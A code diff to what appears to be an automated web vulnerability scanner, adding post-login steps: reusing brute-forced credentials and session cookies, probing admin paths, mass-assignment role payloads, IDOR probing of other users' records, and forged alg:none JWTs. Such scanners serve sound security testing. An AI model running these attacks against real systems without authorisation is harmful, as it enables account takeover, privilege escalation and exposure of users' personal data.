@@ -2558,7 +2558,7 @@ Respond in JSON:
             await self.log(db, "service_attack", "No service vulnerabilities found")
 
     async def _phase_auth_attack(self, db: AsyncSession):
-        """Brute force login forms and test default credentials."""
+        """Brute force login forms, test default credentials, then leverage authenticated access."""
         sem = asyncio.Semaphore(self.context.get("rate_limit") or 5)
         mod = AuthAttackModule(rate_limit=sem)
         findings = await mod.run(self.context)
@@ -2595,8 +2595,584 @@ Respond in JSON:
 
             await self.log(db, "auth_attack",
                 f"Auth attacks found {saved} new vulnerabilities ({len(findings) - saved} deduped)", "warning")
+
+            # --- Auth session propagation: extract creds and establish session ---
+            if not self.context.get("auth_cookie"):
+                await self._propagate_auth_session(findings, db)
+
+            # --- Post-auth endpoint discovery and privilege escalation ---
+            if self.context.get("auth_cookie"):
+                await self._post_auth_deep_scan(db)
         else:
             await self.log(db, "auth_attack", "No auth vulnerabilities found")
+
+    async def _propagate_auth_session(self, findings: list[dict], db: AsyncSession):
+        """Extract valid credentials from auth_attack findings, login, and propagate session."""
+        base_url = self.context.get("base_url", "")
+        for f in findings:
+            # Check for API token directly
+            if f.get("auth_token"):
+                token = f["auth_token"]
+                self.context["auth_cookie"] = f"token={token}"
+                self.context["auth_headers"] = {"Authorization": f"Bearer {token}"}
+                creds = f.get("valid_credentials", {})
+                self.context["valid_credentials"] = [creds] if creds else []
+                await self.log(db, "auth_attack",
+                    f"Auth session propagated via API token from {f.get('url', 'unknown')}")
+                return
+
+            # Check for session cookies from form login
+            if f.get("session_cookies"):
+                cookies = f["session_cookies"]
+                self.context["session_cookies"] = cookies
+                cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
+                self.context["auth_cookie"] = cookie_str
+                creds = f.get("valid_credentials", {})
+                self.context["valid_credentials"] = [creds] if creds else []
+                await self.log(db, "auth_attack",
+                    f"Auth session propagated via cookies from {f.get('url', 'unknown')}")
+                return
+
+            # No direct session data — re-login to get fresh session
+            creds = f.get("valid_credentials")
+            if not creds:
+                continue
+
+            username = creds.get("username", "")
+            password = creds.get("password", "")
+            login_url = creds.get("login_url", "")
+            login_type = creds.get("login_type", "form")
+
+            if not username or not login_url:
+                continue
+
+            try:
+                from app.utils.http_client import make_client
+                if login_type == "api":
+                    # JSON API login
+                    async with make_client(timeout=15.0, follow_redirects=True) as client:
+                        for payload_template in [
+                            {"username": username, "password": password},
+                            {"email": username, "password": password},
+                        ]:
+                            resp = await client.post(login_url, json=payload_template)
+                            if resp.status_code == 200:
+                                try:
+                                    data = resp.json()
+                                    for key in ("token", "access_token", "accessToken", "jwt",
+                                                "session_token", "auth_token"):
+                                        token = data.get(key) or (data.get("data", {}) or {}).get(key)
+                                        if token and isinstance(token, str) and len(token) > 10:
+                                            self.context["auth_cookie"] = f"token={token}"
+                                            self.context["auth_headers"] = {
+                                                "Authorization": f"Bearer {token}"
+                                            }
+                                            self.context["valid_credentials"] = [creds]
+                                            await self.log(db, "auth_attack",
+                                                f"Auth session established: re-login as {username}")
+                                            return
+                                except Exception:
+                                    pass
+                            # Check for session cookies
+                            if resp.cookies:
+                                session_keys = [k for k in resp.cookies.keys()
+                                                if any(s in k.lower()
+                                                       for s in ("session", "token", "auth", "sid"))]
+                                if session_keys:
+                                    cookies = dict(resp.cookies)
+                                    self.context["session_cookies"] = cookies
+                                    cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
+                                    self.context["auth_cookie"] = cookie_str
+                                    self.context["valid_credentials"] = [creds]
+                                    await self.log(db, "auth_attack",
+                                        f"Auth session established via API cookies: {username}")
+                                    return
+                else:
+                    # Form-based login — don't follow redirects to capture cookies
+                    async with make_client(timeout=15.0, follow_redirects=False) as client:
+                        form = creds.get("form", {})
+                        form_data = dict(form.get("other_fields", {}))
+                        form_data[form.get("username_field", "username")] = username
+                        form_data[form.get("password_field", "password")] = password
+
+                        # Re-fetch for fresh CSRF (need a separate client for this)
+                        if form.get("csrf_token"):
+                            async with make_client(timeout=10.0, follow_redirects=True) as csrf_client:
+                                page_resp = await csrf_client.get(form.get("page_url", login_url))
+                                from app.modules.auth_attack import AuthAttackModule
+                                temp_mod = AuthAttackModule()
+                                fresh_form = temp_mod._extract_login_form(page_resp.text, form.get("page_url", login_url))
+                                if fresh_form and fresh_form.get("csrf_token"):
+                                    token_name, token_value = fresh_form["csrf_token"]
+                                    form_data[token_name] = token_value
+
+                        resp = await client.post(login_url, data=form_data)
+
+                        # Extract session from response
+                        if resp.cookies:
+                            cookies = dict(resp.cookies)
+                            self.context["session_cookies"] = cookies
+                            cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
+                            self.context["auth_cookie"] = cookie_str
+                            self.context["valid_credentials"] = [creds]
+                            await self.log(db, "auth_attack",
+                                f"Auth session established via form login: {username}")
+                            return
+
+                        # Follow redirect manually and check for cookies
+                        if resp.status_code in (301, 302, 303, 307):
+                            location = resp.headers.get("location", "")
+                            if location:
+                                from urllib.parse import urljoin
+                                redirect_url = urljoin(login_url, location)
+                                async with make_client(timeout=10.0, follow_redirects=True) as redir_client:
+                                    resp2 = await redir_client.get(redirect_url)
+                                    if resp2.cookies:
+                                        cookies = dict(resp2.cookies)
+                                        self.context["session_cookies"] = cookies
+                                        cookie_str = "; ".join(f"{k}={v}" for k, v in cookies.items())
+                                        self.context["auth_cookie"] = cookie_str
+                                        self.context["valid_credentials"] = [creds]
+                                        await self.log(db, "auth_attack",
+                                            f"Auth session established via form redirect: {username}")
+                                        return
+
+            except Exception as e:
+                await self.log(db, "auth_attack",
+                    f"Re-login failed for {username}: {e}", "warning")
+                continue
+
+        await self.log(db, "auth_attack",
+            "Could not establish auth session from found credentials", "warning")
+
+    async def _post_auth_deep_scan(self, db: AsyncSession):
+        """After auth_attack establishes a session, discover new endpoints and test privilege escalation."""
+        base_url = self.context.get("base_url", "")
+        auth_cookie = self.context.get("auth_cookie", "")
+        if not base_url or not auth_cookie:
+            return
+
+        await self.log(db, "auth_attack", "Starting post-auth deep scan (endpoint discovery + privesc)")
+
+        # --- 1. Post-auth endpoint discovery: revisit URLs that were 401/403 before ---
+        from app.utils.http_client import make_client
+        from urllib.parse import urljoin
+
+        def _build_auth_headers(cookie: str) -> dict:
+            headers = {}
+            if cookie.startswith("token="):
+                headers["Authorization"] = f"Bearer {cookie.split('=', 1)[1]}"
+            else:
+                headers["Cookie"] = cookie
+            # Also add auth_headers if available
+            for k, v in self.context.get("auth_headers", {}).items():
+                headers[k] = v
+            return headers
+
+        auth_headers = _build_auth_headers(auth_cookie)
+
+        # Protected paths to probe with authenticated session
+        protected_paths = [
+            "/admin", "/admin/", "/admin/dashboard", "/admin/users", "/admin/settings",
+            "/dashboard", "/panel", "/settings", "/profile", "/account",
+            "/users", "/manage", "/internal", "/reports", "/billing",
+            "/api/admin", "/api/admin/users", "/api/admin/settings",
+            "/api/users", "/api/me", "/api/profile", "/api/account",
+            "/api/settings", "/api/v1/users", "/api/v1/admin",
+            "/api/v1/me", "/api/v1/settings", "/api/v1/admin/users",
+        ]
+
+        new_auth_endpoints = []
+        privesc_findings = []
+        sem = asyncio.Semaphore(self.context.get("rate_limit") or 5)
+
+        async def _probe_endpoint(path: str):
+            url = urljoin(base_url + "/", path)
+            try:
+                async with sem:
+                    async with make_client(timeout=10.0, follow_redirects=True,
+                                           extra_headers=auth_headers) as client:
+                        resp = await client.get(url)
+                        if resp.status_code < 400:
+                            body = resp.text.lower()
+                            content_type = resp.headers.get("content-type", "")
+
+                            # Skip SPA shells / empty responses
+                            if len(resp.text) < 50:
+                                return
+
+                            new_auth_endpoints.append({
+                                "url": url,
+                                "status": resp.status_code,
+                                "type": "authenticated",
+                                "method": "GET",
+                            })
+
+                            # Check for admin/privileged content
+                            admin_indicators = [
+                                "admin panel", "user management", "system settings",
+                                "all users", "manage users", "admin dashboard",
+                                "configuration", "system config", "role",
+                            ]
+                            if any(ind in body for ind in admin_indicators):
+                                if "/admin" in path:
+                                    privesc_findings.append({
+                                        "url": url,
+                                        "type": "admin_access",
+                                        "evidence": f"Accessed admin endpoint with regular credentials (HTTP {resp.status_code})",
+                                        "body_preview": resp.text[:500],
+                                    })
+            except Exception:
+                pass
+
+        # Probe all protected paths in parallel
+        await asyncio.gather(
+            *[_probe_endpoint(p) for p in protected_paths],
+            return_exceptions=True,
+        )
+
+        # Merge new endpoints into context
+        if new_auth_endpoints:
+            existing = self.context.get("endpoints", [])
+            existing_urls = {(ep.get("url") if isinstance(ep, dict) else ep) for ep in existing}
+            added = 0
+            for ep in new_auth_endpoints:
+                if ep["url"] not in existing_urls:
+                    existing.append(ep)
+                    existing_urls.add(ep["url"])
+                    added += 1
+            self.context["endpoints"] = existing
+            await self.log(db, "auth_attack",
+                f"Post-auth discovery: {added} new authenticated endpoints found")
+
+        # --- 2. Privilege escalation: test admin endpoints with regular user session ---
+        scan_result = await db.execute(select(Scan).where(Scan.id == self.context["scan_id"]))
+        scan = scan_result.scalar_one_or_none()
+
+        if privesc_findings:
+            for pf in privesc_findings:
+                vuln = Vulnerability(
+                    target_id=self.context["target_id"],
+                    scan_id=self.context["scan_id"],
+                    title=f"Privilege escalation: admin endpoint accessible ({pf['url']})"[:500],
+                    vuln_type=VulnType.AUTH_BYPASS,
+                    severity=Severity.CRITICAL,
+                    url=pf["url"][:2000],
+                    method="GET",
+                    description=f"Admin endpoint {pf['url']} is accessible with regular user credentials. "
+                               f"{pf['evidence']}",
+                    impact="Vertical privilege escalation — regular user can access admin functionality.",
+                    remediation="Implement role-based access control (RBAC). "
+                               "Verify user roles server-side before granting access to admin endpoints.",
+                    ai_confidence=0.85,
+                    response_data={"body_preview": pf.get("body_preview", "")},
+                )
+                await self._save_vuln_deduped(db, vuln, scan=scan)
+            await self.log(db, "auth_attack",
+                f"Privilege escalation: {len(privesc_findings)} admin endpoints accessible", "warning")
+
+        # --- 3. Mass assignment check: try adding admin/role params to profile update ---
+        await self._test_mass_assignment_privesc(db, auth_headers, sem, scan)
+
+        # --- 4. Auth-required IDOR: test accessing other users' data ---
+        await self._test_auth_idor(db, auth_headers, sem, scan)
+
+    async def _test_mass_assignment_privesc(self, db: AsyncSession, auth_headers: dict,
+                                             sem: asyncio.Semaphore, scan):
+        """Test if profile/settings endpoints accept role/admin parameters (mass assignment for privesc)."""
+        from app.utils.http_client import make_client
+        from urllib.parse import urljoin
+        base_url = self.context.get("base_url", "")
+
+        profile_endpoints = [
+            "/api/me", "/api/profile", "/api/user", "/api/account",
+            "/api/v1/me", "/api/v1/profile", "/api/v1/user",
+            "/api/users/me", "/api/v1/users/me",
+            "/api/settings", "/api/v1/settings",
+        ]
+
+        # Payloads that attempt to escalate privileges
+        privesc_payloads = [
+            {"role": "admin"},
+            {"admin": True},
+            {"is_admin": True},
+            {"role": "administrator"},
+            {"user_type": "admin"},
+            {"permissions": ["admin"]},
+            {"isAdmin": True},
+            {"access_level": 999},
+        ]
+
+        for path in profile_endpoints:
+            url = urljoin(base_url + "/", path)
+            try:
+                async with sem:
+                    async with make_client(timeout=10.0, extra_headers=auth_headers) as client:
+                        # First GET to check if endpoint exists
+                        get_resp = await client.get(url)
+                        if get_resp.status_code >= 400:
+                            continue
+
+                        # Try PATCH/PUT with privilege escalation params
+                        for payload in privesc_payloads[:4]:  # Limit attempts
+                            for method_name, method_fn in [("PATCH", client.patch), ("PUT", client.put)]:
+                                try:
+                                    resp = await method_fn(
+                                        url, json=payload,
+                                        headers={"Content-Type": "application/json"},
+                                    )
+                                    if resp.status_code in (200, 201):
+                                        # Check if the role/admin field was accepted
+                                        try:
+                                            resp_data = resp.json()
+                                            if isinstance(resp_data, dict):
+                                                for key in ("role", "admin", "is_admin", "isAdmin",
+                                                            "user_type", "access_level"):
+                                                    val = resp_data.get(key)
+                                                    if val and str(val).lower() in ("admin", "administrator",
+                                                                                     "true", "999"):
+                                                        vuln = Vulnerability(
+                                                            target_id=self.context["target_id"],
+                                                            scan_id=self.context["scan_id"],
+                                                            title=f"Mass assignment privilege escalation via {key}={val}"[:500],
+                                                            vuln_type=VulnType.PRIVILEGE_ESCALATION,
+                                                            severity=Severity.CRITICAL,
+                                                            url=url[:2000],
+                                                            parameter=key,
+                                                            method=method_name,
+                                                            description=f"Setting {key}={val} via {method_name} {url} "
+                                                                       f"was accepted by the server, potentially granting admin access.",
+                                                            impact="Vertical privilege escalation through mass assignment.",
+                                                            remediation="Whitelist allowed update fields server-side. "
+                                                                       "Never allow role/admin fields in user-facing update endpoints.",
+                                                            payload_used=json.dumps(payload) if isinstance(payload, dict) else str(payload),
+                                                            request_data={"method": method_name,
+                                                                          "url": url, "body": payload},
+                                                            response_data={"status_code": resp.status_code,
+                                                                           "body_preview": resp.text[:1000]},
+                                                            ai_confidence=0.8,
+                                                        )
+                                                        await self._save_vuln_deduped(db, vuln, scan=scan)
+                                                        await self.log(db, "auth_attack",
+                                                            f"Mass assignment privesc: {key}={val} accepted at {url}", "warning")
+                                                        return  # Found one, stop
+                                        except Exception:
+                                            pass
+                                except Exception:
+                                    continue
+            except Exception:
+                continue
+
+    async def _test_auth_idor(self, db: AsyncSession, auth_headers: dict,
+                               sem: asyncio.Semaphore, scan):
+        """With authenticated session, test accessing other users' resources (IDOR)."""
+        from app.utils.http_client import make_client
+        from urllib.parse import urljoin
+        base_url = self.context.get("base_url", "")
+
+        # Get our own user ID if available
+        own_user_id = None
+        harvested = self.context.get("harvested_ids", {})
+        auto_reg = self.context.get("auto_register_result", {})
+        if auto_reg.get("user_id"):
+            own_user_id = str(auto_reg["user_id"])
+        elif harvested.get("user_id"):
+            ids = harvested["user_id"]
+            own_user_id = ids[-1] if isinstance(ids, list) and ids else None
+
+        # ID sequences to test
+        test_ids = ["1", "2", "3", "0"]
+        if own_user_id:
+            try:
+                own_int = int(own_user_id)
+                test_ids = [str(own_int - 1), str(own_int + 1), "1", "2"]
+            except (ValueError, TypeError):
+                pass
+            # Remove own ID from test set
+            test_ids = [i for i in test_ids if i != own_user_id]
+
+        # IDOR target patterns
+        idor_paths = [
+            "/api/users/{id}", "/api/v1/users/{id}", "/api/v2/users/{id}",
+            "/api/accounts/{id}", "/api/v1/accounts/{id}",
+            "/api/profiles/{id}", "/api/v1/profiles/{id}",
+            "/api/orders/{id}", "/api/v1/orders/{id}",
+            "/api/user/{id}", "/api/account/{id}",
+        ]
+
+        findings_count = 0
+        tested = set()
+
+        for path_template in idor_paths:
+            for test_id in test_ids[:3]:
+                path = path_template.replace("{id}", test_id)
+                url = urljoin(base_url + "/", path)
+                if url in tested:
+                    continue
+                tested.add(url)
+
+                try:
+                    async with sem:
+                        async with make_client(timeout=10.0, extra_headers=auth_headers) as client:
+                            resp = await client.get(url)
+                            if resp.status_code == 200 and len(resp.text) > 50:
+                                try:
+                                    data = resp.json()
+                                    if isinstance(data, dict):
+                                        # Check if we got a different user's data
+                                        resp_id = str(data.get("id", data.get("user_id",
+                                                     data.get("userId", ""))))
+                                        if resp_id and resp_id == test_id and resp_id != own_user_id:
+                                            # Check for PII to confirm it's real data
+                                            pii_keys = {"email", "phone", "name", "address",
+                                                        "ssn", "dob", "password", "secret"}
+                                            has_pii = bool(pii_keys & set(str(k).lower() for k in data.keys()))
+                                            if has_pii:
+                                                vuln = Vulnerability(
+                                                    target_id=self.context["target_id"],
+                                                    scan_id=self.context["scan_id"],
+                                                    title=f"IDOR: accessed user {test_id} data via {path}"[:500],
+                                                    vuln_type=VulnType.AUTH_BYPASS,
+                                                    severity=Severity.HIGH,
+                                                    url=url[:2000],
+                                                    parameter="id",
+                                                    method="GET",
+                                                    description=f"Authenticated as one user, successfully accessed user {test_id}'s data "
+                                                               f"at {url}. Response contains PII fields: {list(pii_keys & set(str(k).lower() for k in data.keys()))}",
+                                                    impact="Horizontal privilege escalation — can access any user's data by changing ID.",
+                                                    remediation="Implement object-level authorization. Verify the requesting user "
+                                                               "owns the requested resource before returning data.",
+                                                    payload_used=f"GET {url}",
+                                                    request_data={"method": "GET", "url": url},
+                                                    response_data={"status_code": 200,
+                                                                   "body_preview": resp.text[:1000]},
+                                                    ai_confidence=0.85,
+                                                )
+                                                await self._save_vuln_deduped(db, vuln, scan=scan)
+                                                findings_count += 1
+                                except Exception:
+                                    pass
+                except Exception:
+                    continue
+
+        if findings_count:
+            await self.log(db, "auth_attack",
+                f"Auth IDOR testing: {findings_count} horizontal privesc findings", "warning")
+
+        # --- JWT sub claim tampering ---
+        await self._test_jwt_tampering(db, auth_headers, sem, scan)
+
+    async def _test_jwt_tampering(self, db: AsyncSession, auth_headers: dict,
+                                   sem: asyncio.Semaphore, scan):
+        """If we have a JWT, test if modifying the sub claim bypasses authorization."""
+        import base64
+        from app.utils.http_client import make_client
+        from urllib.parse import urljoin
+        base_url = self.context.get("base_url", "")
+
+        auth_cookie = self.context.get("auth_cookie", "")
+        token = None
+        if auth_cookie.startswith("token="):
+            token = auth_cookie.split("=", 1)[1]
+        elif self.context.get("auth_headers", {}).get("Authorization", "").startswith("Bearer "):
+            token = self.context["auth_headers"]["Authorization"].split(" ", 1)[1]
+        # Also check harvested tokens
+        if not token:
+            token = self.context.get("harvested_tokens", {}).get("auth_bearer")
+
+        if not token or not token.startswith("eyJ"):
+            return  # Not a JWT
+
+        try:
+            # Decode JWT header and payload (without verification)
+            parts = token.split(".")
+            if len(parts) != 3:
+                return
+
+            # Decode payload
+            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
+            payload_json = base64.urlsafe_b64decode(payload_b64)
+            payload_data = json.loads(payload_json)
+
+            sub = payload_data.get("sub")
+            user_id = payload_data.get("user_id") or payload_data.get("userId") or payload_data.get("id")
+            original_id = sub or user_id
+
+            if not original_id:
+                return
+
+            # Try alg:none attack
+            header_b64 = parts[0] + "=" * (4 - len(parts[0]) % 4)
+            header_json = base64.urlsafe_b64decode(header_b64)
+            header_data = json.loads(header_json)
+
+            # Forge token with alg:none and modified sub
+            forged_header = base64.urlsafe_b64encode(
+                json.dumps({"alg": "none", "typ": "JWT"}).encode()
+            ).rstrip(b"=").decode()
+
+            test_id = "1" if str(original_id) != "1" else "2"
+            modified_payload = dict(payload_data)
+            if sub:
+                modified_payload["sub"] = test_id
+            if user_id:
+                for k in ("user_id", "userId", "id"):
+                    if k in modified_payload:
+                        modified_payload[k] = test_id
+
+            forged_payload = base64.urlsafe_b64encode(
+                json.dumps(modified_payload).encode()
+            ).rstrip(b"=").decode()
+
+            forged_token = f"{forged_header}.{forged_payload}."
+
+            # Test forged token against /api/me or similar
+            test_endpoints = ["/api/me", "/api/v1/me", "/api/profile", "/api/user"]
+            for path in test_endpoints:
+                url = urljoin(base_url + "/", path)
+                try:
+                    async with sem:
+                        forged_headers = {"Authorization": f"Bearer {forged_token}"}
+                        async with make_client(timeout=10.0, extra_headers=forged_headers) as client:
+                            resp = await client.get(url)
+                            if resp.status_code == 200 and len(resp.text) > 50:
+                                try:
+                                    data = resp.json()
+                                    resp_id = str(data.get("id", data.get("sub",
+                                                 data.get("user_id", ""))))
+                                    if resp_id == test_id:
+                                        vuln = Vulnerability(
+                                            target_id=self.context["target_id"],
+                                            scan_id=self.context["scan_id"],
+                                            title=f"JWT alg:none bypass — accessed user {test_id}"[:500],
+                                            vuln_type=VulnType.AUTH_BYPASS,
+                                            severity=Severity.CRITICAL,
+                                            url=url[:2000],
+                                            method="GET",
+                                            description=f"JWT token with alg:none and modified sub={test_id} "
+                                                       f"was accepted by {url}. Server does not verify JWT signature.",
+                                            impact="Complete authentication bypass. Any user's identity can be assumed "
+                                                   "by forging JWT tokens with algorithm set to 'none'.",
+                                            remediation="Always verify JWT signatures server-side. "
+                                                       "Reject tokens with alg:none. Use a strong signing algorithm (RS256/ES256).",
+                                            payload_used=f"JWT alg:none: {forged_token[:80]}...",
+                                            request_data={"method": "GET", "url": url,
+                                                          "headers": forged_headers},
+                                            response_data={"status_code": 200,
+                                                           "body_preview": resp.text[:1000]},
+                                            ai_confidence=0.95,
+                                        )
+                                        await self._save_vuln_deduped(db, vuln, scan=scan)
+                                        await self.log(db, "auth_attack",
+                                            "JWT alg:none bypass confirmed!", "warning")
+                                        return
+                                except Exception:
+                                    pass
+                except Exception:
+                    continue
+
+        except Exception as e:
+            logger.debug(f"JWT tampering test error: {e}")
 
     async def _phase_account_enumeration(self, db: AsyncSession):
         """Detect user existence via side channels in auth flows."""
